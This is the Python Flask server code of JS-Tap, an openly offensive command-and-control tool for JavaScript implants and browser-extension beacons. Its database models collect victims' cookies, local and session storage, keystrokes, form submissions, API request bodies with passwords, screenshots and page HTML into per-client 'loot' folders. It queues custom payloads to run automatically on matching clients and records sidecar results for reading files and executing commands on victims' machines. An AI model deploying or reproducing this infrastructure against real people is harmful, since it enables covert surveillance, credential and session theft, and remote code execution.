#!usr/bin/env python
from flask import Flask, jsonify, abort, make_response, g, request, render_template, redirect, url_for, send_from_directory
from werkzeug.serving import WSGIRequestHandler
from werkzeug.middleware.proxy_fix import ProxyFix
from flask_cors import CORS
from markupsafe import Markup, escape
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import DateTime, func, event, create_engine, orm, Column, Integer, String, DateTime, Text, Boolean, update, UniqueConstraint, or_
from sqlalchemy_utils import database_exists
from sqlalchemy.engine import Engine
from sqlalchemy.orm import scoped_session, sessionmaker, declarative_base
from flask_login import LoginManager, login_user, logout_user, UserMixin, login_required, current_user
from flask_bcrypt import Bcrypt
from sqlalchemy.exc import IntegrityError
from filelock import FileLock, Timeout
from enum import Enum
from user_agents import parse
from email.mime.text import MIMEText
from flask_executor import Executor
from flask_sock import Sock
from apscheduler.schedulers.background import BackgroundScheduler
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.serialization import load_der_public_key
from cryptography.hazmat.primitives.asymmetric import padding as asymmetric_padding
from cryptography.hazmat.primitives import hashes
import magic
import base64
import json
import re
import uuid
import os
import time
import datetime
import threading
import string
import random
import shutil
import logging
import smtplib






# *********************************************************************

def printHeader():
    print("""
                                        ▐▄▄▄.▄▄ ·                       
             .* ./,                      ·██▐█ ▀.                 
             ,    ,,,                  ▪▄ ██▄▀▀▀█▄                                            
            *     .,.*                 ▐▌▐█▌▐█▄▪▐█                                            
           ,*      ,. *.                ▀▀▀• ▀▀▀▀              .(/,#/            
           *        *  *,         .,,.                      ,#%&&&&#            
          ./        ,,  /.          ./#%%&&&&&&&&&&&&%#((//,  ,#%%#/*           
          *,        .*  .(,               ,/#%%&&&&&&&&&&&&&#,   ,   ,.         
          #,         *.  ,(                    .*#%&&&&&&&&&&&%#*     *         
         ,#          .,   /,                  ./(#(  ,*#%%&&&&&&&&(. ,.         
         ,/          .*   ,/                 *%%#(%%%%(   .*(%%%%%&#(,          
 ./*.  ../(,,*******/,/.  ,%/////.         .(*  ,%%%%/     */  ...,%%%%/.       
 *.                 *//   ,#     *.       /,          .***,(.,/    , ,(###*     
 ,,.*,,*/(##((/*/***///   (*....,(.     *,           .*/(%%%(,(*..*.      .*/.  
          #,     .,, /*  */..(*,      ,,       .,/(/,(%%&&&&&&&&%%%/.           
          **         /. ,/  ,,*,    ,,    ,//,       */%%%%%&&&&&&%%%#*         
          .(        */ .*  .*,, , .***,.             *(/%%%%%((#%%%%%%%%#*      
           /       .(,**  *.*,. .,                   *%((%%&%&(#&%&#%%&%%%%(,   
           */      /(/, .*.(.     ,*,               .#%%//%%%&(%&&&(%&&&&&&&&%* 
            (,    *%/.  ,.**... ,..(%%(,           .(%%%#*#%&#(&&%#/&&&&&&&&&&%#
            ./   ,(, ** ..  *,,/**%%&&&%%%#/,,..  *#%%%%* *%#*%&&%((&&&&&&&&&&&&
             ,/.*,    *%(.  .  , .*#%%%%%%%&&&&/(/#%%%#,  .##%&&&%/%&&&&&&&&&&&&
                     .((/,....         ,/##%%%%&&%&%%(.    *%&&&%/%&&&&&&&&&&&&&
                                     ▄▄▄▄▄ ▄▄▄·  ▄▄▄·
                                     •██  ▐█ ▀█ ▐█ ▄█  
                                      ▐█.▪▄█▀▀█  ██▀·  
                                      ▐█▌·▐█ ▪▐▌▐█▪·•  
                                      ▀▀▀  ▀  ▀ .▀   
                                       𝚋𝚢 @𝚑𝚘𝚘𝚍𝚘𝚎𝚛
                               𝚑𝚘𝚘𝚍𝚘𝚎𝚛@𝚋𝚒𝚝𝚠𝚒𝚜𝚎𝚖𝚞𝚗𝚒𝚝𝚒𝚘𝚗𝚜.𝚍𝚎𝚟
        """)


#***************************************************************************
# Configuration

# Proxy mode
# Handy for running nginx proxy in front
# of JS-Tap server to handle SSL certs.
# If set to True
# JS-Tap will run http and rely on nginx
# Note that nginx needs to set an X-Forwarded-For 
# header or JS-Tap won't know the IP address of the cliet
# -----
# If set to False JS-Tap will use a 
# self signed cert
proxyMode    = False

# overwrite based on value in gunicorn startup script
envProxyMode = os.environ.get('PROXYMODE')
if envProxyMode:
    proxyMode = True
elif not envProxyMode:
    proxyMode = False 


# Data Directory
# File path to folder where loot directory 
# and SQLite database are saved
# Data Directory should have the trailing '/' added
dataDirectory = "./"

# overwrite based on value in gunicorn startup script
envDataDir    = os.environ.get('DATADIRECTORY')

if envDataDir is not None:
    dataDirectory = envDataDir





#***************************************************************************
# Initialization stuff
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
fh = logging.FileHandler('./logs.txt')
fh.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
fh.setFormatter(formatter)
logger.addHandler(fh)



app = Flask(__name__)
backgroundExecutor = Executor(app)
sock = Sock(app)
CORS(app)
baseDir = os.path.abspath(os.path.dirname(__file__))


# This variable will be set if started from gunicorn script
secretKey = os.environ.get('SESSIONKEY')

if secretKey is not None:
    app.config['SECRET_KEY'] = secretKey
else:
    app.config['SECRET_KEY'] = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=45))

login_manager = LoginManager()
login_manager.login_view = 'login'
login_manager.init_app(app)
bcrypt = Bcrypt(app)


app.config['SESSION_COOKIE_SECURE']   = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'



# Scoped Session Database setup
database_uri = 'sqlite:///' + os.path.abspath(dataDirectory + 'jsTap.db')
engine       = create_engine(database_uri, connect_args={"check_same_thread": False, "timeout": 60})
db_session   = scoped_session(sessionmaker(autocommit=False, autoflush=False, bind=engine))
Base         = declarative_base()
Base.query   = db_session.query_property()



@app.teardown_request
def remove_scoped_session(exception=None):
    db_session.remove()




#***************************************************************************
# Needed to generate human readable nicknames
AdjectiveList = {
        "funky",
        "smelly",
        "skunky",
        "merry",
        "whimsical",
        "amusing",
        "hysterical",
        "bumfuzzled",
        "bodacious",
        "absurd",
        "animated",
        "brazen",
        "cheesy",
        "clownish",
        "confident",
        "crazy",
        "cuckoo",
        "deranged",
        "ludicrous",
        "playful",
        "quirky",
        "screwball",
        "slapstick",
        "wacky",
        "excited",
        "humorous",
        "charming",
        "fanatical",
        "grumpy",
        "sneaky",
        "rowdy",
        "cheeky",
        "jolly",
        "dizzy",
        "cranky",
        "loopy",
        "baffled",
        "dramatic",
        "feisty",
        "savage",
        "rabid",
        "unhinged",
        "feral",
        "bonkers",
        "maniacal",
        "reckless",
        "volatile",
        "restless",
        "legendary"
}

ColorList = {
        "blue",
        "red",
        "green",
        "white",
        "black",
        "brown",
        "azure",
        "pink",
        "yellow",
        "silver",
        "purple",
        "orange",
        "grey",
        "fuchsia",
        "crimson",
        "lime",
        "plum",
        "olive",
        "cyan",
        "ivory",
        "magenta",
        "teal",
        "coral",
        "scarlet",
        "cobalt",
        "amber",
        "jade",
        "copper",
        "onyx",
        "rust",
        "indigo",
        "charcoal",
        "violet",
        "khaki",
        "slate",
        "maroon"
}


MurderCritter = {
        "kangaroo",
        "koala",
        "dropbear",
        "wombat",
        "wallaby",
        "dingo",
        "emu",
        "tassiedevil",
        "platypus",
        "salty",
        "kookaburra",
        "boxjelly",
        "blueringoctopus",
        "taipan",
        "stonefish",
        "redback",
        "cassowary",
        "funnelwebspider",
        "conesnail",
        "quokka",
        "echidna",
        "dugong",
        "sugarglider",
        "blackswan",
        "huntsman",
        "goanna",
        "numbat",
        "bilby",
        "thornydevil",
        "deathadder",
        "irukandji",
        "magpie",
        "cockatoo",
        "weta",
        "bunyip",
        "yowie",
        "bluebottle",
        "bandicoot",
        "curlew",
        "barramundi"
}






#***************************************************************************
# Database classes
class Client(Base):
    __tablename__ = 'clients'

    id              = Column(Integer, primary_key=True)
    nickname        = Column(String(100), unique=True, nullable=False)
    tag             = Column(String(40), unique=False, nullable=True)
    clientType      = Column(String(20), nullable=False, default='js-implant')
    parentUUID      = Column(String(100), nullable=True) # If spawned by a beacon
    domain          = Column(String(255), nullable=True) # Primary domain for standard implants
    uuid            = Column(String(40), unique=True, nullable=False)
    fingerprint     = Column(String(20), nullable=True)
    sessionValid    = Column(Boolean, nullable=False, default=True)
    notes           = Column(Text, nullable=True)
    firstSeen       = Column(DateTime(timezone=True),server_default=func.now())
    lastSeen        = Column(DateTime(timezone=True), server_default=func.now())
    ipAddress       = Column(String(20), nullable=True)
    platform        = Column(String(100), nullable=True)
    browser         = Column(String(100), nullable=True)
    isStarred       = Column(Boolean, nullable=False, default=False)
    hasJobs         = Column(Boolean, nullable=False, default=False)
    imageCounter    = Column(Integer, server_default='1')
    htmlCodeCounter = Column(Integer, server_default='1')
    receiveKey      = Column(String(44), nullable=True)
    sendKey         = Column(String(44), nullable=True)
    cryptoActive    = Column(Boolean, nullable=False, default=False) # Client confirmed it can use keys (HTTPS)
    sidecarSupported = Column(Boolean, nullable=False, default=False) # Sidecar support built into extension
    sidecarConnected = Column(Boolean, nullable=False, default=False) # Sidecar native host currently connected
    rawUserAgent    = Column(Text, nullable=True)

    def update(self):
        # logger.info("$$ Client Update func")
        self.lastSeen = func.now()

    def __repr__(self):
        return f'<Client {self.id}>'


class BeaconDomain(Base):
    __tablename__ = 'beacondomains'

    id        = Column(Integer, primary_key=True)
    clientID  = Column(String(100), nullable=False)
    domain    = Column(String(255), nullable=False)
    firstSeen = Column(DateTime(timezone=True), server_default=func.now())
    lastSeen  = Column(DateTime(timezone=True), server_default=func.now())

    __table_args__ = (UniqueConstraint('clientID', 'domain', name='_client_domain_uc'),)

    def __repr__(self):
        return f'<BeaconDomain {self.id}>'


class BeaconVisit(Base):
    __tablename__ = 'beaconvisits'

    id        = Column(Integer, primary_key=True)
    domainID  = Column(Integer, nullable=False)
    url       = Column(Text, nullable=False)
    visitTime = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<BeaconVisit {self.id}>'


class BeaconCapture(Base):
    __tablename__ = 'beaconcaptures'

    id         = Column(Integer, primary_key=True)
    domainID   = Column(Integer, nullable=False)
    captureType = Column(String(50), nullable=False) # header, cookie, local_storage, session_storage
    name       = Column(String(255), nullable=False)
    value      = Column(Text, nullable=False)
    extraData  = Column(Text, nullable=True)  # JSON for cookie flags, etc.
    capturedAt = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<BeaconCapture {self.id}>'


# Keep screenshots as files on disk, just track the filename
class Screenshot(Base):
    __tablename__ = 'screenshots'

    id        = Column(Integer, primary_key=True)
    clientID  = Column(String(100), nullable=False)
    timeStamp = Column(DateTime(timezone=True), server_default=func.now())
    fileName  = Column(String(100), nullable=False)
  
    def __repr__(self):
        return f'<Screenshot {self.id}>'


class HtmlCode(Base):
    __tablename__ = 'htmlcode'

    id        = Column(Integer, primary_key=True)
    clientID  = Column(String(100), nullable=False)
    url       = Column(Text, nullable=False)
    timeStamp = Column(DateTime(timezone=True), server_default=func.now())
    fileName  = Column(String(100), nullable=False)


    def __repr__(self):
        return f'<HtmlCode {self.id}>'


class UrlVisited(Base):
    __tablename__ = 'urlsvisited'

    id        = Column(Integer, primary_key=True)
    clientID  = Column(String(100), nullable=False)
    url       = Column(Text, nullable=False)
    timeStamp = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<UrlVisited {self.id}>'


class UserInput(Base):
    __tablename__ = 'userinput'

    id         = Column(Integer, primary_key=True)
    clientID   = Column(String(100), nullable=False)
    inputName  = Column(String(100), nullable=False)
    inputValue = Column(Text, nullable=False)
    timeStamp  = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<UserInput {self.id}>'


class Cookie(Base):
    __tablename__ = 'cookies'

    id          = Column(Integer, primary_key=True)
    clientID    = Column(String(100), nullable=False)
    cookieName  = Column(Text, nullable=False)
    cookieValue = Column(Text, nullable=False)
    timeStamp   = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<Cookie {self.id}>'


class LocalStorage(Base):
    __tablename__ = 'localstorage'

    id        = Column(Integer, primary_key=True)
    clientID  = Column(String(100), nullable=False)
    key       = Column(Text, nullable=False)
    value     = Column(Text, nullable=False)
    timeStamp = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<LocalStorage {self.id}>'


class SessionStorage(Base):
    __tablename__ = 'sessionstorage'

    id        = Column(Integer, primary_key=True)
    clientID  = Column(String(100), nullable=False)
    key       = Column(Text, nullable=False)
    value     = Column(Text, nullable=False)
    timeStamp = Column(DateTime(timezone=True), server_default=func.now())

class Keylog(Base):
    __tablename__  = 'keylogs'
    id             = Column(Integer, primary_key=True)
    clientID       = Column(String(100), nullable=False)
    keys           = Column(Text, nullable=False)
    target         = Column(Text, nullable=True)
    url            = Column(Text, nullable=True)
    timeStamp      = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<SessionStorage {self.id}>'



class XhrApiCall(Base):
    __tablename__ = 'xhrapicall'

    id             = Column(Integer, primary_key=True)
    clientID       = Column(String(100), nullable=False)
    method         = Column(String(100), nullable=False)
    url            = Column(Text, nullable=False)
    asyncRequest   = Column(Boolean, default=True)
    user           = Column(String(100), nullable=True)
    password       = Column(String(100), nullable=True)
    requestBody    = Column(Text, nullable=True)
    responseBody   = Column(Text, nullable=True)
    responseStatus = Column(Integer, nullable=True)
    timeStamp      = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<XhrApiCall {self.id}>'



class XhrHeader(Base):
    __tablename__ = 'xhrheader'

    id        = Column(Integer, primary_key=True)
    apiCallID = Column(Integer, nullable=False)
    clientID  = Column(String(100), nullable=False)
    header    = Column(Text, nullable=False)
    value     = Column(Text, nullable=False)
    timeStamp = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<XhrHeader {self.id}>'



class FetchApiCall(Base):
    __tablename__ = 'fetchapicall'

    id             = Column(Integer, primary_key=True)
    clientID       = Column(String(100), nullable=False)
    method         = Column(String(100), nullable=False)
    url            = Column(Text, nullable=False)
    requestBody    = Column(Text, nullable=True)
    responseBody   = Column(Text, nullable=True)
    responseStatus = Column(Integer, nullable=True)
    timeStamp      = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<FetchApiCall {self.id}>'



class FetchHeader(Base):
    __tablename__ = 'fetchheader'

    id        = Column(Integer, primary_key=True)
    apiCallID = Column(Integer, nullable=False)
    clientID  = Column(String(100), nullable=False)
    header    = Column(Text, nullable=False)
    value     = Column(Text, nullable=False)
    timeStamp = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<FetchHeader {self.id}>'




class FormPost(Base):
    __tablename__ = 'formpost'

    id          = Column(Integer, primary_key=True)
    clientID    = Column(String(100), nullable=False)
    formName    = Column(Text, nullable=True)
    formAction  = Column(String(100), nullable=False)
    formMethod  = Column(String(12), nullable=False)
    formEncType = Column(String(100), nullable=True)
    formData    = Column(Text, nullable=True)
    url         = Column(Text, nullable=False)
    timeStamp   = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<FormPost {self.id}>'



class CustomExfil(Base):
    __tablename__ = 'customexfil'

    id        = Column(Integer, primary_key=True)
    note      = Column(Text, nullable=True)
    data      = Column(Text, nullable=True)
    timeStamp = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<CustomExfil {self.id}>'




class Event(Base):
    __tablename__ = 'events'

    id        = Column(Integer, primary_key=True)
    clientID  = Column(String(100), nullable=False)
    timeStamp = Column(DateTime(timezone=True))
    eventType = Column(String(100), nullable=False)
    eventID   = Column(Integer, nullable=False)

    def __repr__(self):
        return f'<Event {self.id}>'


class BeaconInjection(Base):
    __tablename__ = 'beaconinjections'

    id        = Column(Integer, primary_key=True)
    beaconID  = Column(String(100), nullable=False) # Client UUID
    domain    = Column(String(255), nullable=False)
    tag       = Column(String(50), nullable=False)
    active    = Column(Boolean, nullable=False, default=True)
    last_success = Column(DateTime(timezone=True), nullable=True)
    created_at = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<BeaconInjection {self.id}>'


class SidecarResult(Base):
    __tablename__ = 'sidecarresults'

    id         = Column(Integer, primary_key=True)
    clientID   = Column(String(100), nullable=False)  # beacon UUID
    requestId  = Column(String(100), nullable=False)
    command    = Column(String(50), nullable=False)    # list_dir, read_file, exec_cmd
    success    = Column(Boolean, nullable=False)
    data       = Column(Text, nullable=True)           # JSON string of result data
    error      = Column(Text, nullable=True)
    timeStamp  = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<SidecarResult {self.id}>'


# Application settings
class AppSettings(Base):
    __tablename__ = 'appsettings'

    id                = Column(Integer, primary_key=True)
    allowNewSessions  = Column(Boolean, default=True)
    clientRefreshRate = Column(Integer, default=5)
    showFingerprint   = Column(Boolean, nullable=False, default=False)
    emailServer       = Column(String(100), nullable=True)
    emailUsername     = Column(String(100), nullable=True)
    emailPassword     = Column(String(100), nullable=True)
    emailEventType    = Column(String(100), nullable=True)
    emailDelay        = Column(Integer, default=600)
    emailEnable       = Column(Boolean, nullable=False, default=False)
    lastEmailSent     = Column(DateTime(timezone=True), nullable=True)
    emailContent      = Column(Text, nullable=True)
    obfuscateTraffic  = Column(Boolean, default=False)


    def emailSent(self):
        # logger.info("$$ Client Update func")
        self.lastEmailSent = func.now()

    def __repr__(self):
        return f'<AppSettings {self.id}>'



# Notification Email contact list
class NotificationEmail(Base):
    __tablename__ = 'notificationemails'

    id           = Column(Integer, primary_key=True)
    emailAddress = Column(String(100), nullable=False)

    def __repr__(self):
        return f'<NotificationEmail {self.id}>'




class CustomPayload(Base):
    __tablename__ = 'custompayloads'

    id          = Column(Integer, primary_key=True)
    name        = Column(String(100), nullable=False)
    description = Column(Text, nullable=True)
    code        = Column(Text, nullable=False)
    autorun     = Column(Boolean, nullable=False, default=False)
    repeatrun   = Column(Boolean, nullable=False, default=False)

    def __repr__(self):
        return f'<CustomPayload {self.id}>'

   


class ClientPayloadJob(Base):   
    __tablename__ = 'clientpayloadjobs'

    id          = Column(Integer, primary_key=True)
    clientKey   = Column(Integer, nullable=False)
    payloadKey  = Column(Integer, nullable=False)
    code        = Column(Text, nullable=False)
    repeatrun   = Column(Boolean, nullable=False, default=False)

    def __repr__(self):
        return f'<ClientPayloadJob {self.id}>'



class PayloadTargetRule(Base):
    __tablename__ = 'payloadtargetrules'

    id          = Column(Integer, primary_key=True)
    payloadKey  = Column(Integer, nullable=False)
    filterQuery = Column(String(500), nullable=False)
    active      = Column(Boolean, nullable=False, default=False)
    repeatrun   = Column(Boolean, nullable=False, default=False)

    def __repr__(self):
        return f'<PayloadTargetRule {self.id}>'



class BlockedIP(Base):
    __tablename__ = 'blockedips'

    id  = Column(Integer, primary_key=True)
    ip  = Column(String(20), nullable=False)
  
    def __repr__(self):
        return f'<BlockedIP {self.id}>'



class PluginActivation(Base):
    __tablename__ = 'pluginactivations'

    id          = Column(Integer, primary_key=True)
    clientID    = Column(String(100), nullable=False)
    pluginId    = Column(String(100), nullable=False)
    active      = Column(Boolean, default=True)
    settings    = Column(Text, nullable=True)
    activatedAt = Column(DateTime(timezone=True), server_default=func.now())
    __table_args__ = (UniqueConstraint('clientID', 'pluginId'),)

    def __repr__(self):
        return f'<PluginActivation {self.id}>'



class PluginData(Base):
    __tablename__ = 'plugindata'

    id        = Column(Integer, primary_key=True)
    clientID  = Column(String(100), nullable=False)
    pluginId  = Column(String(100), nullable=False)
    dataType  = Column(String(100), nullable=False)
    data      = Column(Text, nullable=False)
    timeStamp = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<PluginData {self.id}>'



# User C2 UI session
class User(UserMixin, Base):
    __tablename__ = 'user'

    username       = Column(String, primary_key=True)
    password       = Column(String, nullable=False)
    authenticated  = Column(Boolean, default=False)

    def is_active(self):
        # We don't need to deactivate user accounts, but
        # this is a required method
        return True

    def get_id(self):
        return self.username

    def is_authenticated(self):
        return self.authenticated

    def is_anonymous(self):
        # Another unused but required method
        return False





#***************************************************************************
# Plugin System

PLUGINS = {}  # pluginId -> {manifest, path, main.js, renderer.js, ui.html, ui.js}

def loadPlugins():
    pluginsDir = os.path.join(baseDir, 'plugins')
    if not os.path.isdir(pluginsDir):
        os.makedirs(pluginsDir, exist_ok=True)
        return
    for entry in os.listdir(pluginsDir):
        pluginPath = os.path.join(pluginsDir, entry)
        manifestPath = os.path.join(pluginPath, 'manifest.json')
        if not (os.path.isdir(pluginPath) and os.path.isfile(manifestPath)):
            continue
        try:
            with open(manifestPath, 'r') as f:
                manifest = json.load(f)
            plugin = {'manifest': manifest, 'path': pluginPath}
            for fname in ['main.js', 'renderer.js', 'ui.html', 'ui.js']:
                fpath = os.path.join(pluginPath, fname)
                if os.path.isfile(fpath):
                    with open(fpath, 'r') as f:
                        plugin[fname] = f.read()
                else:
                    plugin[fname] = None
            PLUGINS[manifest['id']] = plugin
            logger.info(f"Loaded plugin: {manifest['id']} ({manifest.get('name', '')})")
        except Exception as e:
            logger.error(f"Failed to load plugin from {entry}: {e}")


#***************************************************************************
# Support Functions


# Need function to check session, return download directory
def findLootDirectory(identifier):
    client = Client.query.with_entities(Client.id).filter_by(uuid=identifier).first()

    lootDir = "client_" + str(client.id)
    #logger.info("Loot directory is: " + lootDir)
    return lootDir



def dbCommit():
    # Well, there used to be more stuff here...
    db_session.commit()




def scheduleRepeatTasks(client):
    # Check for repeat run jobs
    payloads = CustomPayload.query.filter_by(repeatrun=True)

    # get client scheduled payload
    clientPayloads = ClientPayloadJob.query.filter_by(clientKey=client.id)

    # Build set of payload IDs already scheduled for this client
    scheduledPayloadIds = set(cp.payloadKey for cp in clientPayloads)

    for payload in payloads:
        if payload.id not in scheduledPayloadIds:
            newJob = ClientPayloadJob(clientKey=client.id, payloadKey=payload.id, code=payload.code, repeatrun=True)
            db_session.add(newJob)
            scheduledPayloadIds.add(payload.id)
            dbCommit()

    # Check target rules with repeat enabled
    targetRules = PayloadTargetRule.query.filter_by(active=True, repeatrun=True).all()
    for rule in targetRules:
        if rule.payloadKey in scheduledPayloadIds:
            continue
        if clientMatchesFilter(client, rule.filterQuery):
            payload = CustomPayload.query.filter_by(id=rule.payloadKey).first()
            if payload:
                newJob = ClientPayloadJob(clientKey=client.id, payloadKey=payload.id, code=payload.code, repeatrun=True)
                db_session.add(newJob)
                scheduledPayloadIds.add(payload.id)
                dbCommit()




def clientMatchesFilter(client, filterQuery):
    """Check if a client matches a filter query string.
    Mirrors the JS filterClients() logic: split on &&, support ! negation,
    case-insensitive substring match, all terms must pass (AND logic).
    """
    filterQuery = filterQuery.strip()
    if not filterQuery:
        return False

    # Build haystack from client fields (mirrors JS filterClients)
    display_domain = client.domain
    if not display_domain and client.clientType != 'bex-beacon':
        latest_url = UrlVisited.query.filter_by(clientID=client.uuid).order_by(UrlVisited.timeStamp.desc()).first()
        if latest_url:
            from urllib.parse import urlparse
            parsed = urlparse(latest_url.url)
            display_domain = parsed.hostname

    haystack = ' '.join([
        client.tag or '',
        client.nickname or '',
        client.ipAddress or '',
        client.fingerprint or '',
        client.platform or '',
        client.browser or '',
        client.clientType or '',
        display_domain or '',
        client.uuid or ''
    ]).lower()

    # Parse terms: split on &&, each can be negated with leading !
    raw_terms = filterQuery.split('&&')
    terms = []
    for t in raw_terms:
        t = t.strip().lower()
        if not t:
            continue
        negate = False
        if t.startswith('!'):
            negate = True
            t = t[1:].strip()
        if t:
            terms.append({'term': t, 'negate': negate})

    if not terms:
        return False

    for term_obj in terms:
        found = term_obj['term'] in haystack
        if term_obj['negate']:
            if found:
                return False
        else:
            if not found:
                return False

    return True



# For testing the SMTP TLS email configuration
def sendTestEmail():
    appSettings  = AppSettings.query.filter_by(id=1).first()
    targetEmails = NotificationEmail.query.all()
  
    fromEmail   = appSettings.emailUsername
    password    = appSettings.emailPassword
    toEmailList = [email.emailAddress for email in targetEmails]

    message = MIMEText("This is a test email from JS-Tap notification service.")
    message["Subject"] = "JS-Tap Notification: Test Email"
    message["From"]    = fromEmail
    message["To"]      = ",".join(toEmailList)
   
    serverInfo = appSettings.emailServer
    hostname, port = serverInfo.split(':')
    port = int(port)

    with smtplib.SMTP(hostname, port) as emailServer:
        emailServer.ehlo()
        emailServer.starttls()
        emailServer.ehlo()

        emailServer.login(fromEmail, password)
        emailServer.sendmail(fromEmail, toEmailList, message.as_string())

    return




# Send the actual notification email
def sendNotificationEmail():
    emailLock.acquire(timeout=2)
    appSettings  = AppSettings.query.filter_by(id=1).first()
    targetEmails = NotificationEmail.query.all()

    fromEmail   = appSettings.emailUsername
    password    = appSettings.emailPassword
    toEmailList = [email.emailAddress for email in targetEmails]

    if appSettings.emailContent:
        message = MIMEText("JS-Tap Update:\n" + appSettings.emailContent)
        message["Subject"] = "JS-Tap Update Notification"
        message["From"]    = fromEmail
        message["To"]      = ",".join(toEmailList)
       
        serverInfo = appSettings.emailServer
        hostname, port = serverInfo.split(':')
        port = int(port)

        logger.info("EMAIL: Sending notification email")
        with smtplib.SMTP(hostname, port) as emailServer:
            emailServer.ehlo()
            emailServer.starttls()
            emailServer.ehlo()

            emailServer.login(fromEmail, password)
            emailServer.sendmail(fromEmail, toEmailList, message.as_string())

        # logger.info("Email Text is: " )
        # logger.info(appSettings.emailContent)
        
        appSettings.emailSent()
        appSettings.emailContent = ""

        dbCommit()
    emailLock.release()
    return







# Check our delay time to see if we should send a notification email or not
def emailNotificationCheck():
    emailSettings = AppSettings.query.with_entities(AppSettings.lastEmailSent, AppSettings.emailDelay).filter_by(id=1).first()

    if emailSettings[0] is not None:
        # We've already sent an email in the past
        # Make sure we're waiting the delay time before firing off another
        now = datetime.datetime.utcnow()

        timeDifference = now - emailSettings[0]
        secondsPassed  = timeDifference.total_seconds()

        if secondsPassed >= emailSettings[1]:
            sendNotificationEmail()
    else:
        # first go, no recorded email sent before, so go ahead and send one
        sendNotificationEmail()

    return



# Timed based notification check. The other email notification check
# is based on events, but if things go quiet some update data could 
# be stuck in the database. This gets called regularly to see if 
# we need to send out a notification email
def timedEmailNotificationCheck():
    isEnabled = AppSettings.query.with_entities(AppSettings.emailEnable).filter_by(id=1).first()

    if (isEnabled):
        emailContent = AppSettings.query.with_entities(AppSettings.emailContent).filter_by(id=1).first()[0]

        if emailContent:
            emailNotificationCheck()
    return





# Handle if we need to do new client notifivation email work
def newClientNotificationEmail(identifier):
    isEnabled = AppSettings.query.with_entities(AppSettings.emailEnable).filter_by(id=1).first()

    if (isEnabled[0]):
        emailText  = AppSettings.query.with_entities(AppSettings.emailContent).filter_by(id=1).first()[0] or ""
        clientData = Client.query.with_entities(Client.nickname, Client.tag, Client.ipAddress).filter_by(uuid=identifier).first()

        now       = datetime.datetime.now()
        timeStamp = now.strftime("%Y-%m-%d %H:%M:%S")
        emailText += timeStamp + ": " + str(clientData[2]) + " - " + str(clientData[1]) + "/" + str(clientData[0]) + " - new client\n" 

        statement = (update(AppSettings).where(AppSettings.id == 1).values(emailContent=emailText))
        db_session.execute(statement)
        dbCommit()

        # Check if it's time to send a notification email
        emailNotificationCheck()
    return




# Handle if we need to do event notification email work
def eventNotificationEmail(identifier):
    emailSettings = AppSettings.query.with_entities(AppSettings.emailEnable, AppSettings.emailEventType).filter_by(id=1).first()

    if (emailSettings[0]):
        # Ok, email notifications are turned on, but do we want to update on events or just new clients?
        if (str(emailSettings[1]) == 'newClientsAndEvents'):
            # Yes, we want to know about events

            emailText  = AppSettings.query.with_entities(AppSettings.emailContent).filter_by(id=1).first()[0] or ""
            clientData = Client.query.with_entities(Client.nickname, Client.tag, Client.ipAddress).filter_by(uuid=identifier).first()

            now       = datetime.datetime.now()
            timeStamp = now.strftime("%Y-%m-%d %H:%M:%S")
            emailText += timeStamp + ": " + str(clientData[2]) + " - " + str(clientData[1]) + "/" + str(clientData[0]) + " - event received\n" 

            statement = (update(AppSettings).where(AppSettings.id == 1).values(emailContent=emailText))
            db_session.execute(statement)
            dbCommit()

            # Check if it's time to send a notification email
            emailNotificationCheck()
    return





# Updates "last seen" timestamp"
# Do not call db commit in here
def clientSeen(identifier, ip, userAgent):
    # logger.info("!! Client seen: " + str(ip) + ', ' + userAgent)
    # logger.info("*** Starting clientSeen Update!")

    # DB commit is handled by caller to clientSeen() method, don't do it here
    client = Client.query.filter_by(uuid=identifier).first()
    client.ipAddress = ip

    if userAgent:
        parsedUserAgent = parse(userAgent)
        client.platform     = parsedUserAgent.os.family
        client.browser      = parsedUserAgent.browser.family + " " + parsedUserAgent.browser.version_string
        client.rawUserAgent = userAgent

    # update method touches the database lastseen timestamp
    client.update()

    # Check if we need to send a notification email
    backgroundExecutor.submit(eventNotificationEmail, identifier)

    # See if we have any scheduling work to do here
    scheduleRepeatTasks(client)






# Check if the UUID sent by client is valid
# and hasn't had it's session invalidated
def isClientSessionValid(identifier):
    client = Client.query.filter_by(uuid=identifier).first()
    if client:
        # Ok, valid client UUID. Check if session is still good
        if (client.sessionValid):
            return True
        else:
            return False
    else:
        # client UUID not in database, shenanigans I say
        return False



# Needed by flask-login
@login_manager.user_loader
def user_loader(username):
    return User.query.filter_by(username=username).first()



# Need an admin account
def addAdminUser():
    currentAdmin = User.query.filter_by(username='admin').first()

    # We won the multithread race, create the admin user
    if currentAdmin is None:
        passwordLength = 45

        randomPassword = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase 
            + string.digits, k=passwordLength))


        logger.info("*******************************")
        logger.info("WebApp admin creds:")
        logger.info("admin : " + randomPassword)
        logger.info("*******************************")

        adminUser = User(username='admin', password=bcrypt.generate_password_hash(randomPassword))

        db_session.add(adminUser)
        dbCommit()

        with open('./adminCreds.txt', 'w') as credFile:
            credFile.write('admin:' + randomPassword + '\n')
